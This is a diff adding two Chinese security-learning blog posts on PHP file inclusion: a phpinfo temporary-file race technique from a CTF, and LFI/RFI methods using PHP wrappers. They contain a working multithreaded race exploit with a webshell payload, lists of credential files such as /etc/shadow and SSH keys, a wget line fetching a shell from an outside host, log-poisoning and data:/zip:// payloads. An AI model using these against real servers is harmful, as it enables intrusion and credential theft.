@@ -3,6 +3,227 @@
   
     
     <entry>
+      <title><![CDATA[WEB-基于phpinfo的包含临时文件]]></title>
+      <url>/2018/04/03/web-phpinfo%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/</url>
+      <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>— phpinfo+LFI —<br><a id="more"></a></p>
+<h2 id="基于phpinfo的包含临时文件"><a href="#基于phpinfo的包含临时文件" class="headerlink" title="基于phpinfo的包含临时文件"></a>基于phpinfo的包含临时文件</h2><p>从N1CTF ezphp 的非预期解中知道的漏洞<br>开始找资料学习</p>
+<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul>
+<li>LFI文件包含漏洞</li>
+<li>一个服务端的phpinfo页面</li>
+</ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>先了解文件上传流程</p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycn3vin6j30oo0emgqi.jpg" alt="10.png"></p>
+<p>向服务器上任意php文件以<code>multipart/form-data</code>方式提交请求上传数据时，会生成临时文件,也就是说不需要一定有显性的上传功能也可以上传生成临时文件。</p>
+<p>下面向我们有的phpinfo页面以multipart/form-data方式提交文件</p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpzlkb0peoj30hd05ddfx.jpg" alt="1.png"></p>
+<blockquote>
+<p>要注意的是 在multipart/form-data方式中，作为分割用的boundary字符串比定义处前面多两个<code>--</code></p>
+</blockquote>
+<p>查看结果，会有在通常GET请求中没看见的参数<code>$_FILES</code></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpzlkg4yewj30x90bidh4.jpg" alt="2.png"></p>
+<blockquote>
+<p>phpinfo中的 upload_tmp_dir 可以查看临时文件存放的文件夹，但是文件名是随机的，所以不能利用<br>如果 php.ini 没有设置 upload_tmp_dir，那么默认 php 进程会读写系统的临时目录<br>(Windows 默认为 C:/windows/temp，Linux 为 /tmp）<br>另外$_FILES 是在运行中作为环境参数产生的，所以在我们平常中访问的phpinfo()不会包含$_FILES</p>
+</blockquote>
+<p>接下来通过<code>phpinfo</code>中的<code>$_FILES</code>来获取临时文件的路径以及名称<br>假如上传的临时文件是木马文件，在被删除之前的极短时间之内,需要与服务器竞争时间包含木马文件，当然包含木马文件得到webshell不太现实，可以让木马文件重新生成一个shell文件或者提供一个反弹shell。</p>
+<h3 id="脚本竞争包含上传的木马文件"><a href="#脚本竞争包含上传的木马文件" class="headerlink" title="脚本竞争包含上传的木马文件"></a>脚本竞争包含上传的木马文件</h3><p>根据以下原理，来构建脚本</p>
+<ul>
+<li>通过分块传输编码，提前获知临时文件名称；<br>分块传输可以实现在未完全传输完成时即可获知临时文件名，可以尽早发起文件包含请求，赶在删除之前执行代码。</li>
+<li>通过增加临时文件名后数据长度来延长时间；<br>通过观察PHPinfo的信息，在$_FILES信息下面，还有请求头的相关信息，我们可以在请求的时候，通过填充大量无用数据，来增加后面数据的长度，从而增加脚本的处理时间，为包含文件争取更多的时间。</li>
+<li>通过大量请求来延迟PHP脚本的执行速度。<br>通过大量的并发请求，提高成功的概率。</li>
+</ul>
+<p>本机虚拟机测试，无限失败，原因不明<br>自己写的脚本与他人成功的脚本都尝试过，无果，可能跟虚拟机环境有关系<br>贴出他人成功的脚本</p>
+<blockquote>
+<p>PS.写脚本时，发现python多线程时，不好在线程外读文件，在多个线程内使用这个文件，没有找到官方解释，可能是内存变动的原因</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="comment">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit</span></div><div class="line"><span class="comment"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</span></div><div class="line"><span class="comment"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</span></div><div class="line"></div><div class="line"><span class="comment">## shell.txt payload content</span></div><div class="line"><span class="comment"># &lt;?php $c=fopen('shell.php','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</div><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE, STDOUT</div><div class="line"></div><div class="line">NumOfThreads=<span class="number">100</span></div><div class="line">queue = Queue.Queue()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">checkHash</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,queue)</span>:</span></div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.queue=queue</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">		i=<span class="number">0</span></div><div class="line">		<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">			self.clear=self.queue.get()</div><div class="line">			passtry = self.clear</div><div class="line">			<span class="keyword">if</span> passtry != <span class="string">""</span>:</div><div class="line"></div><div class="line">				padding=<span class="string">"A"</span> * <span class="number">8000</span></div><div class="line"></div><div class="line">				cookies = &#123;</div><div class="line">				    <span class="string">'PHPSESSID'</span>: <span class="string">'o99quh47clk8br394298tkv5o0'</span>,</div><div class="line">				    <span class="string">'othercookie'</span>: padding</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				headers = &#123;</div><div class="line">				    <span class="string">'User-Agent'</span>: padding,</div><div class="line">				    <span class="string">'Pragma'</span>: padding,</div><div class="line">				    <span class="string">'Accept'</span>: padding,</div><div class="line">				    <span class="string">'Accept-Language'</span>: padding,</div><div class="line">				    <span class="string">'DNT'</span>: <span class="string">'1'</span></div><div class="line">				&#125;</div><div class="line"></div><div class="line">				files = &#123;<span class="string">'arquivo'</span>: open(<span class="string">'shell.txt'</span>,<span class="string">'rb'</span>)&#125;</div><div class="line"></div><div class="line">				reqs=<span class="string">'http://192.168.1.23/phpinfo.php?a='</span>+padding</div><div class="line">				<span class="comment">#reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding</span></div><div class="line">				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				data = re.search(<span class="string">r"(?&lt;=tmp_name] =&amp;gt; ).*"</span>, data).group(<span class="number">0</span>)</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">				reqs = <span class="string">'http://192.168.1.23/lfi.php?action=../..'</span>+data</div><div class="line">				<span class="comment">#reqs = 'http://172.17.0.2:80/index.php?action=../..'+data</span></div><div class="line">				<span class="keyword">print</span> reqs</div><div class="line">				response = requests.get(reqs, verify=<span class="keyword">False</span>)</div><div class="line">				data = response.content</div><div class="line">				<span class="keyword">print</span> data</div><div class="line"></div><div class="line">			i+=<span class="number">1</span></div><div class="line">			self.queue.task_done()</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(NumOfThreads):</div><div class="line">    t=checkHash(queue)</div><div class="line">    t.setDaemon(<span class="keyword">True</span>)</div><div class="line">    t.start()</div><div class="line"></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">9999</span>):</div><div class="line">	x=str(x)</div><div class="line">	queue.put(x.strip())</div><div class="line"></div><div class="line">queue.join()</div></pre></td></tr></table></figure>
+<blockquote>
+<p>参考<br><a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf" target="_blank" rel="external">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a><br><a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a><br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/79830.html</a></p>
+</blockquote>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[WEB-LFI与RFI利用]]></title>
+      <url>/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/</url>
+      <content type="html"><![CDATA[<p>— 从零开始的笔记(长篇) —<br>— 本地文件包含&amp;远程文件包含 —<br>— PHP伪协议利用&amp;文件上传漏洞 —<br><a id="more"></a><br>emmm，从最开始的定义开始吧。</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>PHP的<strong>文件包含</strong>可以直接执行被包含文件的代码，包含的文件格式是不受限制的，只要正常执行即可。<br>文件包含分为 </p>
+<ul>
+<li><code>本地文件包含</code> (local file include)： 包含服务器本地文件</li>
+<li><code>远程文件包含</code> (remote file include)： 包含远程服务器的文件，远程文件包含要求更加苛刻，需要php_ini开启url_allow_fopen 和 url_allow_include(具体情况下面说明)</li>
+</ul>
+<p><strong>文件包含PHP函数</strong>：</p>
+<ul>
+<li>include()：</li>
+<li>include_once()：先验证是否已经包含了文件，如果已经包含了，就不再执行</li>
+<li>require()：</li>
+<li>require_once()：先验证是否已经包含了文件，如果已经包含了，就不再执行</li>
+</ul>
+<p>include()，include_once()：包含文件时即使遇到错误，下面代码会依然执行<br>require()，require_once()：包含文件时遇到错误，直接报错退出程序</p>
+<p>此类漏洞的原理就是include的内容中有我们可控的变量，从而达成我们包含执行我们想要的文件<br>其造成的危害，从文件泄露，到getshell都有<br>下面我们分开细说<strong>LFI</strong>和<strong>RFI</strong></p>
+<h2 id="本地文件包含LFI"><a href="#本地文件包含LFI" class="headerlink" title="本地文件包含LFI"></a>本地文件包含LFI</h2><p><strong>本地文件包含</strong>是指只能包含本机文件的文件包含漏洞，大多出现在模块加载、模板加载和cache调用这些地方，有多重利用方式。<br>先来看一个例子<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action=$_GET[<span class="string">'action'</span>];</div><div class="line"><span class="keyword">include</span> <span class="string">"./$action.php"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>以下拼接的利用方式就是最常规的利用方法</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpyci6sw4aj30c903uq2y.jpg" alt="1.png"><br></div>
+
+<p>再介绍更多的利用方法</p>
+<h3 id="本地目录遍历"><a href="#本地目录遍历" class="headerlink" title="本地目录遍历"></a>本地目录遍历</h3><p>利用<code>../</code>来向上级遍历目录从而一层一层地访问所有文件（有权限的话）<br>打开mysql.php</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpycif4rqmj30fx04idfu.jpg" alt="2.png"><br></div>
+
+<p>成功</p>
+<p>linux下的一些关键文件：</p>
+<ul>
+<li>../../../../../../../etc/passwd(操作系统用户信息,该文件为所有用户可见)</li>
+<li>../../../../../proc/self/environ(proc目录)</li>
+<li>../../../../../../var/log/apache2/access.log(apache日志，需要包括所有上级目录访问权限)</li>
+<li>还有其他配置文件(Web服务器配置文件,Web日志)</li>
+</ul>
+<p>还有其他</p>
+<pre><code>ssh免密码登录的秘钥文件等
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_rsa.keystore
+/root/.ssh/id_rsa.pub
+/root/.ssh/known_hosts
+加密后的用户口令位置
+/etc/shadow
+历史命令
+/root/.bash_history
+/root/.mysql_history
+进程文件
+/proc/self/fd/fd[0-9]* (文件标识符)
+检查已经被系统挂载的设备
+/proc/mounts
+机器的内核配置文件
+/proc/config.gz
+window下
+C:/boot.ini  //查看系统版本
+  C:/Windows/System32/inetsrv/MetaBase.xml  //IIS配置文件
+  C:/Windows/repairsam  //存储系统初次安装的密码
+  C:/Program Files/mysqlmy.ini  //Mysql配置
+  C:/Program Files/mysql/data/mysqluser.MYD  //Mysql root
+  C:/Windows/php.ini  //php配置信息
+  C:/Windows/my.ini  //Mysql配置信息
+</code></pre><p>再能读取一些文件的基础上有更多利用方式</p>
+<h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="/proc/self/environ"></a>/proc/self/environ</h3><p><a href="https://blog.csdn.net/zdwzzu2006/article/details/7747977" target="_blank" rel="external">/proc文件系统</a>：是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。<br><strong>/proc/self/environ</strong>:当前正在运行的进程的环境变量列表</p>
+<p>linux环境下建立lfi.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>($_GET[<span class="string">'$file'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>访问，查看/proc/self/environ</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpycio976rj3100083wg8.jpg" alt="3.png"><br></div>
+
+<p>如图可以看到包含了HTTP头的信息<br>尝试改变他们</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpycitkdcij30ie04b3yo.jpg" alt="4.png"><br></div>
+
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpyciyyzj1j30jh048jrm.jpg" alt="5.png"><br></div>
+
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpycj30ko4j311t082gnh.jpg" alt="6.png"><br></div>
+
+<p>改变成功，也就是说我们可以通过HTTP头控制/proc/self/environ文件</p>
+<h4 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h4><p>发现我们可以控制这些值后，如果写入php代码会直接执行，这个地方就形成了<strong>命令注入执行</strong><br>我们选取user-agent变量向其中插入反弹shell木马</p>
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpycj9e23ij30s5051dga.jpg" alt="7.png"><br></div>
+
+<p>连接shell</p>
+<div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpycjk3qffj30ap023q30.jpg" alt="8.png"><br></div>
+
+<p>成功</p>
+<p>通过其他参数注入也是可以的<br>还可以选取<code>&lt;?system(&#39;wget http://aaa.com/Shells/shell.txt -O shell.php&#39;);?&gt;</code>来下载文件到对方服务器，直接访问木马文件等。</p>
+<blockquote>
+<p>这个地方选取木马不能选取类似于<code>eval($_GET[&#39;cmd&#39;];</code>的webshell<br>因为形成的语句会变为<code>include(../../../proc/self/environ?cmd=&#39;ls&#39;)</code><br>会提示找不到该文件，从而无法包含文件</p>
+</blockquote>
+<h3 id="日志文件污染"><a href="#日志文件污染" class="headerlink" title="日志文件污染"></a>日志文件污染</h3><p><strong>日志文件污染</strong>是通过将注入目标系统的代码写入到日志文件中。<br>通常，访问目标系统上的某些对外开放的服务时，系统会自动将访问记录写入到日志文件中，利用这个机制，有可能会将代码写入到日志中。</p>
+<ul>
+<li>找到日志文件，并且有访问和执行权限（包括所有上级目录访问和执行权限）</li>
+<li>nc提交木马至对方端口，会被写入对方的日志文件</li>
+<li>包含日志文件执行代码</li>
+</ul>
+<blockquote>
+<p>一般日志文件位置<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log<br>/var/log/apache2/access.log</p>
+</blockquote>
+<h4 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h4><p>1.前提有权访问 access.log  /var/log/apache2/access.log （包括所有上级目录访问权限）<br>2.nc提交至对方端口</p>
+<blockquote>
+<p>nc 1.1.1.1 80<br>&lt;?php php木马 ?&gt;<br>（木马写入对方日志文件）</p>
+</blockquote>
+<p>或<br>直接访问页面写入日志文件<br><code>http://www.xxx.com/php木马(urlencode)</code>(会被编码，用bursuite绕过编码)<br>也可以木马写入user-agent来写入日志文件</p>
+<p>3.包含对方日志文件<br>4.url参数 &amp;cmd=命令  执行命令</p>
+<h3 id="利用php-filter"><a href="#利用php-filter" class="headerlink" title="利用php://filter"></a>利用php://filter</h3><p>利用<strong>php://filter</strong>可以读取本地文件源码<br>由于关系到PHP伪协议放在下面详细说明举例</p>
+<h3 id="包含SESSION文件"><a href="#包含SESSION文件" class="headerlink" title="包含SESSION文件"></a>包含SESSION文件</h3><p>session文件格式为<code>sess_[phpsessid]</code>,phpsessid作为cookie传递，在服务端文件位置会变化</p>
+<pre><code>默认位置
+/tmp/(PHP Sessions)
+也可能
+/var/lib/php/session/(PHP Sessions)
+/var/lib/php5/(PHP Sessions)
+c:/windows/temp/(PHP Sessions)等文件中。
+</code></pre><p>尝试读取session文件<br><code>?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7</code><br>在某些特定的情况下如果你能够控制session的值，也许能够获得一个shell。</p>
+<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>如果你知道上传文件在服务器放置的位置，就可以上传木马文件，然后包含木马文件，这就是<code>文件上传漏洞</code>+<code>文件包含漏洞</code>的COMBO<br>关于可以知道上传文件在服务器的位置的，但是上传文件后缀名等等被过滤了。可以利用上传文件有关<strong>PHP伪协议</strong>的<code>绕过</code>，将在之后讨论</p>
+<p>还有一种包含<strong>上传文件的tmp临时文件</strong>，因为往往上传文件会被重点防护，而临时文件不会被关注到。这种攻击方式不容易被防护，其中关键是知道临时文件路径及名称，关于这种攻击由于此文篇幅太长，另起一片叙述<code>基于phpinfo的包含临时文件</code></p>
+<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含 RFI"></a>远程文件包含 RFI</h2><p>远程文件包含(RFI)紧密相关的两个php配置：<br><strong>allow_url_fopen</strong>:远程文件打开<br><strong>allow_url_include</strong>:远程文件包含<br>配置细节请查阅<a href="https://lalajun.github.io/2018/03/06/WEB-PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/#allow-url-include-%E6%98%AF%E5%90%A6%E5%85%81%E8%AE%B8%E5%8C%85%E5%90%AB%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6" target="_blank" rel="external">php核心配置</a></p>
+<p>那么开始说明应用</p>
+<blockquote>
+<p>开始前，补充。<br>php中<strong>fopen函数</strong>与<strong>include函数</strong>区别：<br>fopen与include打开/包含远程文件时，对方服务器都会先解析文件然后被本地php代码 打开/包含。<br>区别是：<br>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。include会包含进入代码内，再解析执行一次。<br>所以include包含的文件里有木马时，可以执行。fopen打开一个包含木马的文件，不会有什么大危害，因为只是作为文本文件。</p>
+</blockquote>
+<p>以下测试是在php5.2中完成。</p>
+<h3 id="当allow-url-fopen和allow-url-include都为On时"><a href="#当allow-url-fopen和allow-url-include都为On时" class="headerlink" title="当allow_url_fopen和allow_url_include都为On时"></a>当<em>allow_url_fopen</em>和<em>allow_url_include</em>都为On时</h3><p>可以进行远程文件包含执行，即可以包含在自己服务器的木马，形成web-shell。<br>也可以使用wget之类的命令来下载木马，保存，再访问木马文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8z6itpmj30r705bt8z.jpg" alt="3.png"><br></div>
+
+<h4 id="data-输入方式"><a href="#data-输入方式" class="headerlink" title="data:输入方式"></a>data:输入方式</h4><p>另外还有一种方法是<a href="http://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="external">data：</a><br>本以为<strong>data：</strong>可以在<em>allow_url_fopen</em>为Off时可以起作用，测试时发现不可以。应该是<strong>data：</strong>被当做allow_url_fopen禁止的一项了。</p>
+<blockquote>
+<p>file=data:text/plain,&lt;?php phpinfo()?&gt;<br>file=data:text/plain,&lt;?php print_r(scandir(“.”));?&gt;<br>file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</p>
+</blockquote>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb90by9w2j30io08bweu.jpg" alt="8.png"><br></div>
+
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb9062e6hj30if0a6wet.jpg" alt="7.png"><br></div>
+
+<h3 id="当allow-url-fopen为On-allow-url-include不为Off时"><a href="#当allow-url-fopen为On-allow-url-include不为Off时" class="headerlink" title="当allow_url_fopen为On,allow_url_include不为Off时"></a>当<em>allow_url_fopen</em>为On,<em>allow_url_include</em>不为Off时</h3><p>只能进行远程文件打开，比如fopen(url)。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"></div><div class="line">$file=fopen($url,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line"><span class="keyword">while</span> (!feof($file))&#123;</div><div class="line">    $line = fgets($file,<span class="number">1024</span>);   </div><div class="line">    <span class="keyword">echo</span> $line;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8zi936vj30lw04gwej.jpg" alt="4.png"><br></div>
+
+<h3 id="当allow-url-fopen为Off，allow-url-include为On时"><a href="#当allow-url-fopen为Off，allow-url-include为On时" class="headerlink" title="当allow_url_fopen为Off，allow_url_include为On时"></a>当<em>allow_url_fopen</em>为Off，<em>allow_url_include</em>为On时</h3><p>当allow_url_include为On，而allow_url_fopen为Off的时候，不可以直接远程包含文件<br>但是可以使用    php://input、 php://stdin、 php://memory 和 php://temp等伪协议</p>
+<p>由于php伪协议利用方式多样，我们新开一个篇章说明。但是要知道一些php伪协议的利用前提是allow_url_include为On，具体以官方文档为主</p>
+<h2 id="php伪协议-PHP："><a href="#php伪协议-PHP：" class="headerlink" title="php伪协议 PHP：//"></a>php伪协议 PHP：//</h2><p>先查看<a href="http://php.net/manual/zh/wrappers.php.php" target="_blank" rel="external">PHP官方说明</a>,了解php伪协议</p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><strong>php://input</strong>代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。<br>需要allow_url_include=On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);<span class="comment">#加入此处变为$url.'php' 就无法利用，%00截断测试也无效</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8zq81swj30iv0amwf2.jpg" alt="5.png"><br></div>
+
+<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpb8zzo64xj30k80a8t92.jpg" alt="6.png"><br></div>
+
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。<br><strong>不需要</strong>allow_url_include=On<br>格式：<br><code>php://filter/read=过滤器/resource=来源</code><br>关于php://filter有很多<a href="http://php.net/manual/zh/filters.php" target="_blank" rel="external">过滤器</a>可以使用<br>但是最经典的用法如下：</p>
+<p><code>php://filter/convert.base64-encode/resource=index.php</code>read被省略</p>
+<p>网页源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action=$_GET[<span class="string">'action'</span>];</div><div class="line"><span class="keyword">include</span> <span class="string">"$action.php"</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>利用php://filter读取同目录下phpinfo.php</p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpycl9b3fxj30sq078mxm.jpg" alt="9.png"><br></div>
+
+<h2 id="php伪协议phar-zip"><a href="#php伪协议phar-zip" class="headerlink" title="php伪协议phar:// zip://"></a>php伪协议phar:// zip://</h2><p>因为这两者性质差不多，就放一起了<br><a href="http://php.net/manual/zh/wrappers.phar.php" target="_blank" rel="external">phar://</a> :PHP 归档，不受allow_url_include影响，PHP 5.3.0 起有效<br><a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="external">zip://</a> :压缩流，不受allow_url_include影响<br>利用在文件包含漏洞+上传文件漏洞</p>
+<p>当上传的文件不能以php结尾，被php解析的时候，可以把文件压缩成<strong>压缩包</strong>，改为.jpg结尾再上传<br>再通过<code>phar://</code> <code>zip://</code>解压缩打开，使用方法如下</p>
+<h3 id="zip-使用"><a href="#zip-使用" class="headerlink" title="zip://使用"></a>zip://使用</h3><p>把木马文件1.php用zip压缩成1.zip，再修改后缀名为.jpg，绕过上传验证，再进行包含<br><code>/zip_phar.php?file=zip://D:/php/WWW/php_text/upfile/1.jpg%231.php</code><br>协议原型：zip://archive.zip#dir/file.txt <code>压缩包全路径#目录/文件</code><br>在测试中只有绝对路径可行，相对路径不行<br>另外在URL中需要把#编码，因为#与url协议冲突</p>
+<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpyclm1yvsj30z506tt99.jpg" alt="11.jpg"><br></div>
+
+<p>测试木马为<strong>&lt;?php echo ‘success’ ;?&gt;</strong></p>
+<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpyclrcz9hj30m20523yn.jpg" alt="12.jpg"><br></div>
+
